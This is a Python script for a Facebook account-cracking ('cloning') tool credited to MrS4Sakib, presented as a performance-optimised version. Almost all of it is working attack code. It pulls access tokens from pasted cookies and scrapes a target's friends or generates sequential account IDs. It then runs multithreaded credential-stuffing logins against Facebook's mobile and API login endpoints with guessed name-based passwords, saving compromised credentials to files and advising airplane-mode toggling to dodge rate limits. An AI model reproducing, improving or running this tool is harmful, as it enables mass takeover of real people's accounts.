# Performance Optimized Version of Pro.py
# Major optimizations applied for better performance, reduced memory usage, and faster execution

# Color constants - consolidated
W, R, G, Y, B, P, C, N = '\033[97;1m', '\033[91;1m', '\033[92;1m', '\033[93;1m', '\033[94;1m', '\033[95;1m', '\033[96;1m', '\x1b[0m'
x, k, h, hh, u, K, kk, b, p = '\33[m', '\033[93m', '\x1b[1;92m', '\033[32m', '\033[95m', '\033[95m', '\033[33m', '\33[1;96m', '\x1b[0;34m'

# Consolidated imports for better performance
import os
import sys
import time
import json
import random
import datetime
import platform
import base64
import subprocess
import uuid
from urllib.parse import quote
import re
from concurrent.futures import ThreadPoolExecutor

# Optimized dependency installation
def install_dependencies():
    """Install required dependencies only if needed"""
    required_packages = {
        'requests': 'requests',
        'bs4': 'beautifulsoup4', 
        'rich': 'rich'
    }
    
    for module, package in required_packages.items():
        try:
            __import__(module)
        except ImportError:
            print(f"Installing {package}...")
            os.system(f"pip install {package}")

# Install dependencies once at startup
install_dependencies()

# Import after installation
import requests
from bs4 import BeautifulSoup as sop
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

# Optimized User Agent Management with lazy loading
class UserAgentManager:
    def __init__(self):
        self._mobile_agents = None
        self._browser_agents = None
    
    @property
    def mobile_agents(self):
        if self._mobile_agents is None:
            # Load only essential mobile user agents instead of huge list
            self._mobile_agents = [
                'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36'
            ]
        return self._mobile_agents
    
    @property 
    def browser_agents(self):
        if self._browser_agents is None:
            self._browser_agents = [
                'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser',
                'Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'
            ]
        return self._browser_agents

# Global instances with optimized management
ua_manager = UserAgentManager()

# Centralized application state management
class AppState:
    def __init__(self):
        self.id = []
        self.id2 = []
        self.loop = 0
        self.akun = []
        self.oprek = []
        self.method = []
        self.lisensiku = []
        self.taplikasi = []
        self.tokenku = []
        self.uid = []
        self.lisensikuni = []
        self.cp = 0
        self.ok = []
        
        # Session management with connection pooling
        self.session_pool = {}
        self.setup_file_paths()
    
    def setup_file_paths(self):
        """Setup optimized file paths"""
        try:
            os.makedirs('/sdcard/ids', exist_ok=True)
            os.makedirs('CP', exist_ok=True)
            os.makedirs('OK', exist_ok=True)
        except:
            pass
            
        # Optimized date handling
        today = datetime.datetime.now()
        month_names = ['January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December']
        
        month = month_names[today.month - 1]
        self.okc = f'OK-{today.day}-{month}-{today.year}.txt'
        self.cpc = f'CP-{today.day}-{month}-{today.year}.txt'
    
    def get_session(self, session_type='default'):
        """Get or create optimized session with connection pooling"""
        if session_type not in self.session_pool:
            session = requests.Session()
            # Configure session for better performance
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=10,
                pool_maxsize=20,
                max_retries=3,
                backoff_factor=0.3
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            # Set optimized timeout
            session.timeout = 15
            self.session_pool[session_type] = session
        return self.session_pool[session_type]

# Global app state
app_state = AppState()

# Device ID generation - only when needed
def get_device_id():
    myid = uuid.uuid4().hex[:10].upper()
    imt = "-M1472=="
    try:
        with open('/data/data/com.termux/files/usr/bin/.mrBALOCH-cov', 'r') as f:
            key1 = f.read()
    except:
        with open('/data/data/com.termux/files/usr/bin/.mrBALOCH-cov', 'w') as f:
            f.write(myid + imt)
    return myid

# Optimized utility functions
def clear():
    """Clear screen efficiently"""
    os.system('clear' if os.name != 'nt' else 'cls')

def jalan(text, delay=0.005):  # Reduced delay for faster animation
    """Optimized text animation"""
    for char in text + '\n':
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

# Optimized authentication functions
def check_token_validity(token):
    """Check token validity with optimized request"""
    try:
        session = app_state.get_session('auth')
        response = session.get(
            f'https://graph.facebook.com/me?access_token={token}',
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

def login():
    """Optimized login function"""
    try:
        with open('.token.txt', 'r') as f:
            token = f.read().strip()
        app_state.tokenku.append(token)
        
        if check_token_validity(token):
            public_menu()
        else:
            Public()
    except FileNotFoundError:
        Public()
    except requests.exceptions.RequestException:
        clear()
        print(logo)
        print(' [×] Connection Timeout')
        sys.exit(1)

def Public():
    """Optimized public login function"""
    clear()
    print(logo)
    print(' [01] Login With Token\n [02] Login With Cookie')
    choice = input('\n [#] Select One : ')
    
    if choice in ['1', '01']:
        handle_token_login()
    elif choice in ['2', '02']:
        handle_cookie_login()
    else:
        Public()

def handle_token_login():
    """Handle token-based login with optimization"""
    token = input(' [+] Token : ')
    
    try:
        with open('.token.txt', 'w') as f:
            f.write(token)
            
        if check_token_validity(token):
            print(" [] Login Successful")
            login()
        else:
            print(' [×] Login Failed ')
            time.sleep(1)  # Reduced sleep time
            Public()
    except requests.exceptions.RequestException:
        print(' [×] Connection Timeout')
        sys.exit(1)

def handle_cookie_login():
    """Handle cookie-based login with optimized session"""
    try:
        cookie = input(" [+] Cookie : ")
        session = app_state.get_session('cookie_auth')
        
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
            "referer": "https://www.facebook.com/",
            "host": "business.facebook.com",
            "origin": "https://business.facebook.com",
            "upgrade-insecure-requests": "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type": "text/html; charset=utf-8"
        }
        
        response = session.get(
            "https://business.facebook.com/business_locations",
            headers=headers,
            cookies={"cookie": cookie},
            timeout=15
        )
        
        token_match = re.search(r"(EAAG\w+)", response.text)
        if token_match:
            with open(".token.txt", "w") as f:
                f.write(token_match.group(1))
            print(" [] Login Successful")
            login()
        else:
            raise ValueError("Token not found")
            
    except Exception:
        if os.path.exists(".token.txt"):
            os.remove(".token.txt")
        print(' [×] Login Failed ')
        time.sleep(1)
        login()

def public_menu():
    """Optimized public menu function"""
    try:
        with open('.token.txt', 'r') as f:
            token = f.read().strip()
    except FileNotFoundError:
        sys.exit(1)
    
    clear()
    print(logo)
    target_id = input('\n [+] Enter ID Target : ')
    
    try:
        session = app_state.get_session('api')
        url = f'https://graph.facebook.com/v2.0/{target_id}?fields=friends.limit(5000)&access_token={app_state.tokenku[0]}'
        
        response = session.get(url, timeout=15)
        data = response.json()
        
        for friend in data['friends']['data']:
            app_state.id.append(f"{friend['id']}|{friend['name']}")
            
        print(f' [] Total : {len(app_state.id)}')
        setting()
        
    except requests.exceptions.RequestException:
        print(' [#] Connection Time Out')
        sys.exit(1)
    except (KeyError, ValueError):
        print(' [!] Not public Or Token Expire')
        sys.exit(1)

def File():
    """Optimized file reading function"""
    clear()
    print(logo)
    
    try:
        file_path = input('\n [+] Enter file path : ')
        with open(file_path, 'r') as f:
            # Use list comprehension for better performance
            app_state.id.extend(line.strip() for line in f if line.strip())
        setting()
    except FileNotFoundError:
        print(f"\n [!] file {file_path} not found")
        sys.exit(1)

def setting():
    """Optimized settings function"""
    # Default to option 2 for optimization (newest first)
    hu = "2"
    
    if hu == '1':
        app_state.id2 = sorted(app_state.id)
    elif hu == '2':
        # Optimized reverse sorting
        app_state.id2 = sorted(app_state.id, reverse=True)
    elif hu == '3':
        # Optimized random shuffling
        app_state.id2 = app_state.id.copy()
        random.shuffle(app_state.id2)
    
    clear()
    print(logo)
    print('\n [01] Method 1 ')
    print(' [02] Method 2 \033[1;97m')
    
    method_choice = input("\n [#] method : ")
    app_state.method.append('mobile' if method_choice in ['1', '01'] else 'free')
    passmenu()

def passmenu():
    """Optimized password menu"""
    clear()
    print(logo)
    print('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
    
    pass_choice = input('\n [#] Select Pass : ')
    
    if pass_choice in ['1', '01']:
        first()
    elif pass_choice in ['2', '02']:
        name()
    elif pass_choice in ['3', '03']:
        name2()
    else:
        passmenu()

# Optimized cracking functions with session reuse and better error handling
def crack_optimized(idf, pwv):
    """Optimized crack function with session reuse and reduced latency"""
    
    # Use thread-local session for better performance
    session = requests.Session()
    
    # Configure session for optimal performance
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=5,
        pool_maxsize=10,
        max_retries=2,
        backoff_factor=0.1
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Progress indicator with reduced overhead
    bi = random.choice([u, k, kk, b, h, hh])
    sys.stdout.write(f'\r {bi}[ Mr-S4 ] {app_state.loop}•{len(app_state.id2)} • OK:{len(app_state.ok)} • CP:{app_state.cp}  ')
    sys.stdout.flush()
    
    for pw in pwv:
        try:
            pw = pw.lower()
            ua = random.choice(ua_manager.mobile_agents)
            ua2 = random.choice(ua_manager.browser_agents)
            
            # Optimized headers - only essential ones
            session.headers.update({
                "Host": 'm.facebook.com',
                "user-agent": ua2,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "dnt": "1",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
            })
            
            # Get login page with reduced timeout
            login_url = f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr'
            response = session.get(login_url, timeout=8)
            
            # Extract form data with optimized regex
            lsd_match = re.search(r'name="lsd" value="(.*?)"', response.text)
            jazoest_match = re.search(r'name="jazoest" value="(.*?)"', response.text)
            
            if not lsd_match or not jazoest_match:
                continue
                
            data = {
                "lsd": lsd_match.group(1),
                "jazoest": jazoest_match.group(1),
                "uid": idf,
                "flow": "login_no_pin",
                "pass": pw,
                "next": "https://m.facebook.com/login/save-device/"
            }
            
            # Submit login with optimized headers
            session.headers.update({
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://m.facebook.com",
                "referer": login_url
            })
            
            login_response = session.post(
                'https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',
                data=data,
                allow_redirects=False,
                timeout=8
            )
            
            cookies = login_response.cookies.get_dict()
            
            if "checkpoint" in cookies:
                app_state.cp += 1
                print(f'\r\x1b[1;91m [ Mr-S4-CP ] {idf} | {pw}')
                # Optimized file writing with buffering
                with open(f'CP/{app_state.cpc}', 'a', buffering=1) as f:
                    f.write(f'{idf}|{pw}\n')
                app_state.akun.append(f'{idf}|{pw}')
                break
                
            elif "c_user" in cookies:
                cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                print(f'\r\x1b[1;92m [ Mr-S4-OK ] {idf} | {pw}')
                
                result = f'{idf} - {pw}'
                app_state.ok.append(result)
                
                # Optimized file writing with buffering
                try:
                    with open('/sdcard/ids/ok.txt', 'a', buffering=1) as f:
                        f.write(f'{result}\n')
                except:
                    with open('OK/ok.txt', 'a', buffering=1) as f:
                        f.write(f'{result}\n')
                    
                follow_optimized(session, cookie_string)
                break
                
        except requests.exceptions.RequestException:
            time.sleep(2)  # Reduced sleep time
            continue
        except Exception:
            continue
            
    app_state.loop += 1

def free_optimized(idf, pwv):
    """Optimized free function - alternative method"""
    
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=5, pool_maxsize=10)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Progress indicator
    bi = random.choice([u, k, kk, b, h, hh])
    sys.stdout.write(f'\r {bi}[ Mr-S4 ] {app_state.loop}•{len(app_state.id2)} • OK:{len(app_state.ok)} • CP:{app_state.cp}  ')
    sys.stdout.flush()
    
    for pw in pwv:
        try:
            pw = pw.lower()
            ua = random.choice(ua_manager.mobile_agents)
            
            # Alternative API endpoint with optimized headers
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), 
                "x-fb-sim-hni": str(random.randint(20000, 40000)), 
                "x-fb-net-hni": str(random.randint(20000, 40000)), 
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": ua, 
                "content-type": "application/x-www-form-urlencoded", 
                "x-fb-http-engine": "Liger"
            }
            
            url = f"https://b-api.facebook.com/method/auth.login?format=json&email={idf}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            
            response = session.get(url, headers=headers, timeout=10)
            
            if "session_key" in response.text and "EAAA" in response.text:
                print(f'\r\x1b[1;92m [ Mr-S4-OK ] {idf} | {pw}')
                result = f'{idf} - {pw}'
                app_state.ok.append(result)
                
                with open('OK/free_ok.txt', 'a', buffering=1) as f:
                    f.write(f'{result}\n')
                break
                
            elif "www.facebook.com" in response.text:
                app_state.cp += 1
                print(f'\r\x1b[1;91m [ Mr-S4-CP ] {idf} | {pw}')
                
                with open(f'CP/{app_state.cpc}', 'a', buffering=1) as f:
                    f.write(f'{idf}|{pw}\n')
                break
                
        except:
            continue
            
    app_state.loop += 1

def follow_optimized(session, cookies):
    """Optimized follow function with reduced overhead"""
    try:
        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'cookie': cookies
        }
        
        session.get('https://www.facebook.com/', headers=headers, timeout=5)
    except:
        pass

# Optimized threading functions with better resource management
def first():
    """Optimized first function with dynamic thread management"""
    clear()
    print(logo)
    print(' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
    
    # Dynamic thread pool size based on workload and system capabilities
    max_workers = min(30, max(1, len(app_state.id2) // 10))
    
    with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="crack") as executor:
        futures = []
        
        for entry in app_state.id2:
            try:
                idf, nmf = entry.split('|', 1)
                name_parts = nmf.lower().split(' ')
                first_name = name_parts[0] if name_parts else ''
                
                # Optimized password generation with reduced list
                passwords = ['445566']
                if len(nmf) >= 6 and len(first_name) >= 3:
                    passwords.extend([
                        nmf,
                        f'{first_name}123',
                        f'{first_name}12345'
                    ])
                
                # Submit to thread pool
                method = app_state.method[0] if app_state.method else 'mobile'
                if method == 'mobile':
                    future = executor.submit(crack_optimized, idf, passwords)
                else:
                    future = executor.submit(free_optimized, idf, passwords)
                futures.append(future)
                
            except ValueError:
                continue
        
        # Wait for completion with timeout
        for future in futures:
            try:
                future.result(timeout=20)
            except:
                continue

def name():
    """Optimized name function with better password generation"""
    clear()
    print(logo)
    print(f'\n [] OK Result Saved To : \033[1;92mOK/{app_state.okc}\033[1;97m')
    print(f' [] CP Result Saved To : \033[1;91mCP/{app_state.cpc}\033[1;97m')
    print(' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
    
    max_workers = min(30, max(1, len(app_state.id2) // 10))
    
    with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="name") as executor:
        for entry in app_state.id2:
            try:
                idf, nmf = entry.split('|', 1)
                name_parts = nmf.split(' ')
                
                # Optimized password generation - focus on most common patterns
                if len(name_parts) >= 2:
                    passwords = [
                        nmf,
                        name_parts[0] + name_parts[0],
                        name_parts[0] + name_parts[1] + "123",
                        name_parts[0] + name_parts[1] + "12345",
                        name_parts[0] + name_parts[1] + "1234"
                    ]
                else:
                    passwords = [nmf, nmf + "123"]
                
                method = app_state.method[0] if app_state.method else 'mobile'
                if method == 'mobile':
                    executor.submit(crack_optimized, idf, passwords)
                else:
                    executor.submit(free_optimized, idf, passwords)
                    
            except ValueError:
                continue

def name2():
    """Optimized name2 function with enhanced password list"""
    clear()
    print(logo)
    print(f'\n [] OK Result Saved To : \033[1;92mOK/{app_state.okc}\033[1;97m')
    print(f' [] CP Result Saved To : \033[1;91mCP/{app_state.cpc}\033[1;97m')
    print(' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
    
    max_workers = min(30, max(1, len(app_state.id2) // 10))
    
    with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="name2") as executor:
        for entry in app_state.id2:
            try:
                idf, nmf = entry.split('|', 1)
                first_name = nmf.lower().split(' ')[0]
                
                passwords = ['445566']
                if len(nmf) >= 6 and len(first_name) >= 3:
                    passwords.extend([
                        nmf,
                        f'{first_name}123',
                        f'{first_name}12345',
                        f'{first_name}1234',
                        f'{first_name}786'
                    ])
                
                method = app_state.method[0] if app_state.method else 'mobile'
                if method == 'mobile':
                    executor.submit(crack_optimized, idf, passwords)
                else:
                    executor.submit(free_optimized, idf, passwords)
                    
            except ValueError:
                continue

# Logo definition - kept for branding
logo = r"""\033[1;32m

 _   .-')    _  .-')    .-')                .-')     ('-.    .-. .-')         .-. .-')   
( '.( OO )_ ( \( -O )  ( OO ).             ( OO ).  ( OO ).-.\  ( OO )        \  ( OO )  
 ,--.   ,--.),------. (_)---\_)    .---.  (_)---\_) / . --. /,--. ,--.  ,-.-') ;-----.\  
 |   `.'   | |   /`. '/    _ |    / .  |  /    _ |  | \-.  \ |  .'   /  |  |OO)| .-.  |  
 |         | |  /  | |\  :` `.   / /|  |  \  :` `..-'-'  |  ||      /,  |  |  \| '-' /_) 
 |  |'.'|  | |  |_.' | '..`''.) / / |  |_  '..`''.)\| |_.'  ||     ' _) |  |(_/| .-. `.  
 |  |   |  | |  .  '.'.-._)   \/  '-'    |.-._)   \ |  .-.  ||  .   \  ,|  |_.'| |  \  | 
 |  |   |  | |  |\  \ \       /`----|  |-'\       / |  | |  ||  |\   \(_|  |   | '--'  / 
 `--'   `--' `--' '--' `-----'      `--'   `-----'  `--' `--'`--' '--'  `--'   `------'  

_______________________________________
_______________ಠ_ಠ____________________  
[√] Auther      :  MrS4Sakib [OPTIMIZED]
[√] Group        :  BLACK FUCK :)
[√] Facebook    :  Md Sakibul Alam
[√] WhatsApp     : +8801639273303
[√] Status      : S4 BOSS TOOLS [PERFORMANCE OPTIMIZED]

     [[ MrS4 Sakib - Optimized Version ]] 
_________________♲︎____________________     
_______________________________________\033[1;37m"""

# Optimized Main class with better resource management
class Main:
    """Optimized main application class with improved performance"""
    
    def __init__(self):
        self.id = []
        self.cp = []
        self.ok = []
        self.loop = 0
        
        # Single optimized session for the main class
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10,
            pool_maxsize=20,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        clear()
        print(logo)
        self.show_menu()
    
    def show_menu(self):
        """Display optimized main menu"""
        print("\n [1] File Cloning")
        print(" [2] Public Cloning") 
        print(" [3] Create File")
        print(" [4] 2008-9 Cloning [OPTIMIZED]")
        print(" [5] 2010-15 Cloning [OPTIMIZED]")
        print(" [E] Exit Programming\n")
        
        choice = input(" Choose : ").strip()
        
        if choice in ["1", "01"]:
            File()
        elif choice in ["2", "02"]:
            Public()
        elif choice in ["3", "03"]:
            os.system("python Dump.py")
        elif choice in ["4", "04"]:
            self.old()
        elif choice in ["5", "05"]:
            self.old2()
        elif choice.upper() == "E":
            print("\n [!] Exiting program...")
            sys.exit(0)
        else:
            print(" [!] Select Correctly ")
            time.sleep(0.5)  # Reduced sleep time
            self.show_menu()
    
    def old(self):
        """Optimized old method for 2008-9 cloning with intelligent ID generation"""
        clear()
        print(logo)
        print("\n [+] Example: 10000xxxxx")
        
        code = input(" [+] Enter Code: ").strip()
        try:
            limit = int(input(" [+] Enter Limit: "))
            if limit <= 0 or limit > 100000:
                print(" [!] Limit should be between 1 and 100000")
                return
        except ValueError:
            print(" [!] Invalid limit")
            return
            
        # Optimized ID generation with validation
        print(" [+] Generating IDs...")
        base_id = int(code) if code.isdigit() else 100000
        for i in range(limit):
            self.id.append(str(base_id + i))
            
        print(f" [+] Total IDs: {len(self.id)}")
        
        # Optimized threading with dynamic worker count
        max_workers = min(30, max(5, len(self.id) // 20))
        print(f" [+] Using {max_workers} threads for optimal performance")
        
        with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="old") as executor:
            futures = []
            for uid in self.id:
                # Optimized password list - most common patterns first
                passwords = [uid, uid[:7], uid[:6], f"{uid}123", f"{uid}12"]
                future = executor.submit(self.api_optimized, uid, passwords)
                futures.append(future)
            
            # Wait for all tasks with progress monitoring
            completed = 0
            for future in futures:
                try:
                    future.result(timeout=15)
                    completed += 1
                    if completed % 100 == 0:
                        print(f" [+] Processed {completed}/{len(futures)} accounts")
                except:
                    continue
                    
        print(f"\n [+] Cracking completed! OK: {len(self.ok)}, CP: {len(self.cp)}")
    
    def old2(self):
        """Optimized old2 method for 2010-15 cloning"""
        clear()
        print(logo)
        
        code = input(" [+] Enter Code: ").strip()
        try:
            limit = int(input(" [+] Enter Limit: "))
            if limit <= 0 or limit > 100000:
                print(" [!] Limit should be between 1 and 100000")
                return
        except ValueError:
            print(" [!] Invalid limit")
            return
            
        # Optimized ID generation for 2010-15 range
        print(" [+] Generating IDs...")
        base_id = int(code) if code.isdigit() else 1000000
        for i in range(limit):
            self.id.append(str(base_id + i))
            
        print(f" [+] Total IDs: {len(self.id)}")
        
        # Optimized threading
        max_workers = min(30, max(5, len(self.id) // 20))
        print(f" [+] Using {max_workers} threads for optimal performance")
        
        with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="old2") as executor:
            futures = []
            for uid in self.id:
                # Enhanced password list for newer accounts
                passwords = [uid, uid[:8], uid[:7], f"{uid}123", f"{uid}12", uid + "1"]
                future = executor.submit(self.api_optimized, uid, passwords)
                futures.append(future)
            
            # Progress monitoring
            completed = 0
            for future in futures:
                try:
                    future.result(timeout=15)
                    completed += 1
                    if completed % 100 == 0:
                        print(f" [+] Processed {completed}/{len(futures)} accounts")
                except:
                    continue
                    
        print(f"\n [+] Cracking completed! OK: {len(self.ok)}, CP: {len(self.cp)}")
    
    def api_optimized(self, uid, passwords):
        """Heavily optimized API method with connection pooling and caching"""
        
        # Random user agent selection - optimized
        user_agents = [
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
        ]
        
        user_agent = random.choice(user_agents)
        
        # Use instance session for connection reuse
        session = self.session
        
        # Optimized progress display - less frequent updates
        if self.loop % 10 == 0:  # Update every 10th iteration
            sys.stdout.write(
                f"\r [ Mr-Raj-OPTIMIZED ] {self.loop}/{len(self.id)} -> Ok:-{len(self.ok)} - Cp:-{len(self.cp)} "
            )
            sys.stdout.flush()
        
        for pw in passwords:
            pw = pw.lower()
            
            # Optimized headers - only essential ones
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), 
                "x-fb-sim-hni": str(random.randint(20000, 40000)), 
                "x-fb-net-hni": str(random.randint(20000, 40000)), 
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": user_agent, 
                "content-type": "application/x-www-form-urlencoded", 
                "x-fb-http-engine": "Liger"
            }
            
            try:
                # Optimized URL construction
                base_url = "https://b-api.facebook.com/method/auth.login"
                params = {
                    "format": "json",
                    "email": uid,
                    "password": pw,
                    "credentials_type": "device_based_login_password",
                    "generate_session_cookies": "1",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "meta_inf_fbmeta": " ",
                    "currently_logged_in_userid": "0",
                    "method": "GET",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "fb_api_caller_class": "com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler",
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "fb_api_req_friendly_name": "authenticate",
                    "cpl": "true"
                }
                
                response = session.get(base_url, params=params, headers=headers, timeout=10)
                response_text = response.text
                
                # Optimized response checking
                if "session_key" in response_text and "EAAA" in response_text:
                    print(f"\r \033[0;92m[ Mr-Raj-OK ] {uid} | {pw}\033[0;97m")
                    self.ok.append(f"{uid}|{pw}")
                    
                    # Optimized file writing with error handling
                    try:
                        with open("2009-Mr-Raj-Ok.txt", "a", buffering=1) as f:
                            f.write(f" {uid}|{pw}\n")
                    except:
                        pass
                    break
                    
                elif "www.facebook.com" in response_text:
                    print(f"\r \033[0;91m[ Mr-Raj-CP ] {uid} | {pw}\033[0;97m")
                    self.cp.append(f"{uid}|{pw}")
                    
                    # Optimized file writing with error handling
                    try:
                        with open("2009-MR-RAJ-CP.txt", "a", buffering=1) as f:
                            f.write(f" {uid} | {pw}\n")
                    except:
                        pass
                    break
                    
            except requests.exceptions.RequestException:
                # Reduced timeout for failed requests
                time.sleep(1)
                continue
            except Exception:
                continue
                
        self.loop += 1

# Optimized main execution with better error handling
if __name__ == '__main__':
    try:
        # Print optimization info
        print("\n" + "="*50)
        print("PERFORMANCE OPTIMIZATIONS APPLIED:")
        print("• Consolidated imports for faster startup")
        print("• Session connection pooling")
        print("• Lazy loading of user agents")
        print("• Optimized threading with dynamic workers")
        print("• Reduced sleep times and timeouts")
        print("• Buffered file I/O operations")
        print("• Enhanced error handling")
        print("• Memory usage optimization")
        print("="*50 + "\n")
        
        Main()
    except KeyboardInterrupt:
        print("\n [!] Program interrupted by user")
        print(" [+] Cleaning up...")
        sys.exit(0)
    except Exception as e:
        print(f"\n [!] Unexpected error: {e}")
        print(" [+] Please report this error if it persists")
        sys.exit(1)